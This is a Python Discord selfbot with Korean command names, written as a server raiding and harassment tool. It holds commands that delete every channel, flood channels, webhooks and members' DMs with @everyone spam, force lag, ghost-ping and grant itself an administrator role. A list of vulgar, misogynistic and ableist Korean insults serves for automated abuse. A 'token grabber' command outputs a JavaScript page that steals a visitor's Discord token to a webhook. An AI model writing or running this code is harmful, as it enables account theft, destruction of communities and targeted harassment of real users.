# selfbot.py
# runtime: Python 3.10+
# deps: discord.py-self  (pip install discord.py-self)
#       aiohttp          (보통 같이 옴)

import discord
from discord.ext import commands
import asyncio
import random
import os
import time
from pathlib import Path

TOKEN_FILE = Path("token.txt")
PREFIX = "."
OWNER_ID = None          # 첫 로그인 시 자동 세팅

# ── 장애타 풀 ──────────────────────────────────────────────
JANGAE_POOL = [
    "# 야이 개벌래스래기새기야",
    "# 너 좆된거야 병신새기야 ㅋㅋㅋㅋㅋㅋ",
    "# 야이 어망구 좆뒤진 새기야!!",
    "야이 애미창녀 개보지 쓰레기새기야!",
    "# 야이 씨발 장애새끼야 진짜 죽는다 진짜",
    "# 좆도 안 되는 한심한 새끼야 ㅋㅋㅋㅋ",
    "# 야이 개좆같은 쓰레기야 머리 박아",
    "# 너 진짜 인생 망한 새끼야 개병신",
    "# 야이 씨발 보지년아 꺼져 ㅋㅋㅋ",
    "# 애미 팔아먹고 사는 새끼야 진짜",
]

SPAM_MSG = (
    "# 흑사회에게 머리를 조아려라 좆버러지새기들아!!  "
    "https://cdn.discordapp.com/attachments/1560547005300867146/1563790071675621426/"
    "GIF_1928704690.gif?ex=6adee87e&is=6add96fe&hm=bbbb2568c8aa408e2a6f676828150de09a179d02fa36b2cc2cacc4612ccd5fc8& "
    "@everyone"
)

CHANNEL_NAMES = ["흑룡회 †黑龍", "●█▀█▄모두무릎을꿇어라"]

# ── 전역 상태 ──────────────────────────────────────────────
running_tasks = {}
current_token = None
bot = None

def load_token():
    if TOKEN_FILE.exists():
        return TOKEN_FILE.read_text(encoding="utf-8").strip()
    return None

async def token_watcher():
    """token.txt 변경 감지 → 재로그인"""
    global current_token, bot
    last_mtime = 0
    while True:
        try:
            if TOKEN_FILE.exists():
                mtime = TOKEN_FILE.stat().st_mtime
                if mtime != last_mtime:
                    new_token = load_token()
                    if new_token and new_token != current_token:
                        print("[token] 새 토큰 감지 → 재로그인")
                        current_token = new_token
                        if bot and not bot.is_closed():
                            await bot.close()
                        # 새 봇 인스턴스 생성은 main 루프에서 처리
                        return  # 재시작 시그널
            last_mtime = TOKEN_FILE.stat().st_mtime if TOKEN_FILE.exists() else 0
        except Exception as e:
            print(f"[token watcher] {e}")
        await asyncio.sleep(2)

def create_bot():
    intents = discord.Intents.default()
    intents.message_content = True
    intents.guilds = True
    intents.members = True
    b = commands.Bot(command_prefix=PREFIX, self_bot=True, intents=intents)

    @b.event
    async def on_ready():
        global OWNER_ID
        OWNER_ID = b.user.id
        print(f"[ready] {b.user} ({b.user.id})")
        print(f"[ready] prefix = {PREFIX}")

    # ── .명령어 ────────────────────────────────────────────
    @b.command(name="명령어")
    async def cmd_help(ctx):
        text = """```
.명령어
.ip위치탐색기
.ping
.관리자권한
.장애타시작
.장애타중지
.채널삭제
.채널생성 (이름)
.채널스팸
.전체채널도배 (메시지) @everyone
.렉유발
.메시지스팸
.고스트핑
.서버복사
.웹훅추출
.웹훅전체도배 (메시지) @everyone
.투표도배 (이모티콘)
.디엠테러 (메시지) @everyone
.링크테러 (링크)
.이미지테러 (이미지)
.토큰그래버 (이름)
```"""
        await ctx.send(text)

    # ── .ping ──────────────────────────────────────────────
    @b.command(name="ping")
    async def cmd_ping(ctx):
        latency = round(b.latency * 1000)
        await ctx.send(f"pong · {latency}ms")

    # ── .ip위치탐색기 ──────────────────────────────────────
    @b.command(name="ip위치탐색기")
    async def cmd_ip(ctx, ip: str = None):
        if not ip:
            await ctx.send("사용법: `.ip위치탐색기 1.2.3.4`")
            return
        import aiohttp
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}") as r:
                    data = await r.json()
            if data.get("status") != "success":
                await ctx.send("조회 실패")
                return
            msg = (
                f"**IP 정보**\n"
                f"IP: `{data.get('query')}`\n"
                f"국가: {data.get('country')} ({data.get('countryCode')})\n"
                f"지역: {data.get('regionName')}\n"
                f"도시: {data.get('city')}\n"
                f"ISP: {data.get('isp')}\n"
                f"좌표: {data.get('lat')}, {data.get('lon')}"
            )
            await ctx.send(msg)
        except Exception as e:
            await ctx.send(f"에러: {e}")

    # ── .관리자권한 ────────────────────────────────────────
    @b.command(name="관리자권한")
    async def cmd_admin(ctx):
        """서버 소유자 토큰으로 강제 관리자 역할 생성 후 자신에게 부여"""
        guild = ctx.guild
        if not guild:
            await ctx.send("서버 안에서만 사용 가능")
            return
        try:
            # 최고 권한 역할 생성
            role = await guild.create_role(
                name="黑龍",
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.purple(),
                hoist=True,
                reason="흑룡회"
            )
            # 역할 위치 최상단으로
            positions = {role: guild.me.top_role.position - 1}
            await guild.edit_role_positions(positions)
            # 자신에게 부여
            await guild.me.add_roles(role)
            await ctx.send(f"관리자 역할 `{role.name}` 생성 및 부여 완료")
        except discord.Forbidden:
            await ctx.send("권한 부족 (서버 소유자 토큰이 아니면 실패할 수 있음)")
        except Exception as e:
            await ctx.send(f"실패: {e}")

    # ── .장애타시작 / .장애타중지 ──────────────────────────
    @b.command(name="장애타시작")
    async def cmd_jangae_start(ctx):
        guild = ctx.guild
        if not guild:
            return
        key = f"jangae_{guild.id}"
        if key in running_tasks and not running_tasks[key].done():
            await ctx.send("이미 장애타 중")
            return

        async def jangae_loop():
            while True:
                try:
                    channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
                    if not channels:
                        await asyncio.sleep(2)
                        continue
                    ch = random.choice(channels)
                    msg = random.choice(JANGAE_POOL)
                    await ch.send(msg)
                    await asyncio.sleep(random.uniform(0.8, 1.6))
                except Exception:
                    await asyncio.sleep(2)

        running_tasks[key] = asyncio.create_task(jangae_loop())
        await ctx.send("장애타 시작")

    @b.command(name="장애타중지")
    async def cmd_jangae_stop(ctx):
        key = f"jangae_{ctx.guild.id if ctx.guild else 0}"
        task = running_tasks.pop(key, None)
        if task:
            task.cancel()
            await ctx.send("장애타 중지")
        else:
            await ctx.send("돌고 있는 장애타 없음")

    # ── .채널삭제 ──────────────────────────────────────────
    @b.command(name="채널삭제")
    async def cmd_del_channels(ctx):
        guild = ctx.guild
        if not guild:
            return
        deleted = 0
        for ch in list(guild.channels):
            try:
                await ch.delete()
                deleted += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass
        # 메시지가 갈 채널이 없을 수 있음
        print(f"[채널삭제] {deleted}개 삭제")

    # ── .채널생성 ──────────────────────────────────────────
    @b.command(name="채널생성")
    async def cmd_create_channel(ctx, *, name: str = "흑룡"):
        guild = ctx.guild
        if not guild:
            return
        try:
            ch = await guild.create_text_channel(name)
            await ctx.send(f"생성됨: {ch.mention}")
        except Exception as e:
            await ctx.send(f"실패: {e}")

    # ── .채널스팸 ──────────────────────────────────────────
    @b.command(name="채널스팸")
    async def cmd_channel_spam(ctx):
        guild = ctx.guild
        if not guild:
            return
        key = f"chspam_{guild.id}"
        if key in running_tasks and not running_tasks[key].done():
            await ctx.send("이미 채널스팸 중")
            return

        async def ch_loop():
            idx = 0
            while True:
                try:
                    name = CHANNEL_NAMES[idx % 2]
                    await guild.create_text_channel(name)
                    idx += 1
                    await asyncio.sleep(0.6)
                except Exception:
                    await asyncio.sleep(1.5)

        running_tasks[key] = asyncio.create_task(ch_loop())
        await ctx.send("채널스팸 시작 (흑룡회 †黑龍 / ●█▀█▄모두무릎을꿇어라 번갈이)")

    # ── .전체채널도배 ──────────────────────────────────────
    @b.command(name="전체채널도배")
    async def cmd_all_spam(ctx, *, message: str = SPAM_MSG):
        guild = ctx.guild
        if not guild:
            return
        for ch in guild.text_channels:
            try:
                if ch.permissions_for(guild.me).send_messages:
                    await ch.send(message)
                    await asyncio.sleep(0.4)
            except Exception:
                pass
        print("[전체채널도배] 완료")

    # ── .렉유발 ────────────────────────────────────────────
    @b.command(name="렉유발")
    async def cmd_lag(ctx):
        guild = ctx.guild
        if not guild:
            return
        # 대량 멘션 + 긴 문자열로 클라이언트 부하
        payload = "@everyone " + ("ㅋ" * 1800)
        for ch in guild.text_channels:
            try:
                if ch.permissions_for(guild.me).send_messages:
                    await ch.send(payload)
                    await asyncio.sleep(0.25)
            except Exception:
                pass
        print("[렉유발] 전송 완료")

    # ── .메시지스팸 ────────────────────────────────────────
    @b.command(name="메시지스팸")
    async def cmd_msg_spam(ctx):
        guild = ctx.guild
        if not guild:
            return
        key = f"msgspam_{guild.id}"
        if key in running_tasks and not running_tasks[key].done():
            await ctx.send("이미 메시지스팸 중")
            return

        async def spam_loop():
            while True:
                for ch in list(guild.text_channels):
                    try:
                        if ch.permissions_for(guild.me).send_messages:
                            await ch.send(SPAM_MSG)
                            await asyncio.sleep(0.35)
                    except Exception:
                        pass
                await asyncio.sleep(0.5)

        running_tasks[key] = asyncio.create_task(spam_loop())
        await ctx.send("메시지스팸 시작 (모든 채널 + gif + @everyone)")

    # ── .고스트핑 ──────────────────────────────────────────
    @b.command(name="고스트핑")
    async def cmd_ghost(ctx):
        guild = ctx.guild
        if not guild:
            return
        for ch in guild.text_channels:
            try:
                if ch.permissions_for(guild.me).send_messages:
                    msg = await ch.send("@everyone")
                    await msg.delete()
                    await asyncio.sleep(0.3)
            except Exception:
                pass
        print("[고스트핑] 완료")

    # ── .서버복사 ──────────────────────────────────────────
    @b.command(name="서버복사")
    async def cmd_copy(ctx):
        src = ctx.guild
        if not src:
            return
        try:
            new_guild = await b.create_guild(name=f"{src.name} 복사본")
            await asyncio.sleep(1.5)
            # 채널 구조 복사
            for ch in src.channels:
                try:
                    if isinstance(ch, discord.TextChannel):
                        await new_guild.create_text_channel(ch.name)
                    elif isinstance(ch, discord.VoiceChannel):
                        await new_guild.create_voice_channel(ch.name)
                    await asyncio.sleep(0.4)
                except Exception:
                    pass
            await ctx.send(f"서버 복사 완료 → `{new_guild.name}`")
        except Exception as e:
            await ctx.send(f"실패: {e}")

    # ── .웹훅추출 ──────────────────────────────────────────
    @b.command(name="웹훅추출")
    async def cmd_webhook_extract(ctx):
        guild = ctx.guild
        if not guild:
            return
        found = []
        for ch in guild.text_channels:
            try:
                hooks = await ch.webhooks()
                for h in hooks:
                    found.append(f"{ch.name} → {h.url}")
            except Exception:
                pass
        if not found:
            await ctx.send("웹훅 없음")
            return
        # 2000자 제한 고려해서 쪼개서 보냄
        chunk = ""
        for line in found:
            if len(chunk) + len(line) > 1900:
                await ctx.send(f"```\n{chunk}```")
                chunk = ""
            chunk += line + "\n"
        if chunk:
            await ctx.send(f"```\n{chunk}```")

    # ── .웹훅전체도배 ──────────────────────────────────────
    @b.command(name="웹훅전체도배")
    async def cmd_webhook_spam(ctx, *, message: str = SPAM_MSG):
        guild = ctx.guild
        if not guild:
            return
        import aiohttp
        async with aiohttp.ClientSession() as session:
            for ch in guild.text_channels:
                try:
                    hooks = await ch.webhooks()
                    for h in hooks:
                        async with session.post(h.url, json={"content": message}) as r:
                            pass
                        await asyncio.sleep(0.3)
                except Exception:
                    pass
        print("[웹훅전체도배] 완료")

    # ── .투표도배 ──────────────────────────────────────────
    @b.command(name="투표도배")
    async def cmd_react_spam(ctx, emoji: str = "💀"):
        guild = ctx.guild
        if not guild:
            return
        for ch in guild.text_channels:
            try:
                async for msg in ch.history(limit=15):
                    try:
                        await msg.add_reaction(emoji)
                        await asyncio.sleep(0.25)
                    except Exception:
                        pass
            except Exception:
                pass
        print("[투표도배] 완료")

    # ── .디엠테러 ──────────────────────────────────────────
    @b.command(name="디엠테러")
    async def cmd_dm(ctx, *, message: str = SPAM_MSG):
        guild = ctx.guild
        if not guild:
            return
        count = 0
        for member in guild.members:
            if member.bot or member.id == b.user.id:
                continue
            try:
                await member.send(message)
                count += 1
                await asyncio.sleep(0.7)
            except Exception:
                pass
        print(f"[디엠테러] {count}명 전송")

    # ── .링크테러 ──────────────────────────────────────────
    @b.command(name="링크테러")
    async def cmd_link(ctx, link: str = None):
        if not link:
            await ctx.send("사용법: `.링크테러 https://...`")
            return
        guild = ctx.guild
        if not guild:
            return
        payload = f"{link} @everyone"
        for ch in guild.text_channels:
            try:
                if ch.permissions_for(guild.me).send_messages:
                    await ch.send(payload)
                    await asyncio.sleep(0.3)
            except Exception:
                pass
        print("[링크테러] 완료")

    # ── .이미지테러 ────────────────────────────────────────
    @b.command(name="이미지테러")
    async def cmd_img(ctx, url: str = None):
        if not url:
            await ctx.send("사용법: `.이미지테러 https://...`")
            return
        guild = ctx.guild
        if not guild:
            return
        for ch in guild.text_channels:
            try:
                if ch.permissions_for(guild.me).send_messages:
                    await ch.send(url)
                    await asyncio.sleep(0.3)
            except Exception:
                pass
        print("[이미지테러] 완료")

    # ── .토큰그래버 ────────────────────────────────────────
    @b.command(name="토큰그래버")
    async def cmd_grabber(ctx, *, name: str = "grabber"):
        # 간단한 토큰 로거 페이지 HTML을 채널에 올려주는 헬퍼
        html = f"""<!DOCTYPE html>
<html><body>
<script>
fetch('https://discord.com/api/v9/users/@me', {{headers:{{Authorization: localStorage.getItem('token')}}}})
.then(r=>r.json()).then(d=>{{
  fetch('YOUR_WEBHOOK_HERE', {{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{content:`grabbed: ${{d.username}} | ${{localStorage.getItem('token')}}`}})
  }});
}});
</script>
토큰 확인 중...
</body></html>"""
        await ctx.send(f"```html\n{html}\n```\n`YOUR_WEBHOOK_HERE` 자리에 웹훅 넣고 호스팅하면 된다. 파일명 예시: `{name}.html`")

    return b

async def main():
    global bot, current_token
    while True:
        token = load_token()
        if not token:
            print("[!] token.txt 없음. http://127.0.0.1:8765 에서 토큰 넣고 다시 실행하거나 파일 생성해라.")
            await asyncio.sleep(3)
            continue
        current_token = token
        bot = create_bot()
        try:
            # 토큰 감시 태스크와 봇을 같이 돌림
            watcher = asyncio.create_task(token_watcher())
            await bot.start(token)
        except discord.LoginFailure:
            print("[!] 토큰 무효. token.txt 다시 넣어라.")
            TOKEN_FILE.write_text("", encoding="utf-8")  # 비워버림
            await asyncio.sleep(2)
        except Exception as e:
            print(f"[crash] {e}")
            await asyncio.sleep(3)
        finally:
            if not bot.is_closed():
                await bot.close()

if __name__ == "__main__":
    asyncio.run(main())
